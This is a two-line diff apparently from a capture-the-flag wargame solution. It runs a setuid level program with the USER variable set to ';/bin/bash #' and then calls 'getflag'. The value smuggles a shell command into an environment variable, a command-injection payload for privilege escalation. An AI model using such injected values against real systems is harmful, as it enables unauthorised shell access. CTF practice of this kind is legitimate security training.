@@ -1,1 +1,2 @@
 USER=";/bin/bash #" ./level03
+getflag
